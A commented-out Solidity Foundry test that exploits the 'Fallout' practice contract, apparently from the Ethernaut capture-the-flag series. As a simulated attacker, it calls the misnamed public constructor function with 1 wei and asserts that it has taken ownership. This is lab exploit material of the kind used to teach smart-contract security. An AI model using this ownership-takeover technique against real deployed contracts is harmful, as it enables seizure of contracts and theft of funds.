// // SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

// import "../src/Fallout.sol";
// import "@forge-std/Test.sol";

// contract FalloutTest is Test {
//     Fallout public falloutContract;
//     address public attacker;
//     function setUp() public {
//         falloutContract = new Fallout();
//         attacker = vm.addr(1);
//         vm.deal(attacker, 1 ether);
//     }

//     function testExploit() public {
//         vm.startPrank(attacker);
//         falloutContract.Fallout{value: 1 wei}();
//         vm.stopPrank();

//         assertEq(attacker, falloutContract.owner());
//     }
// }
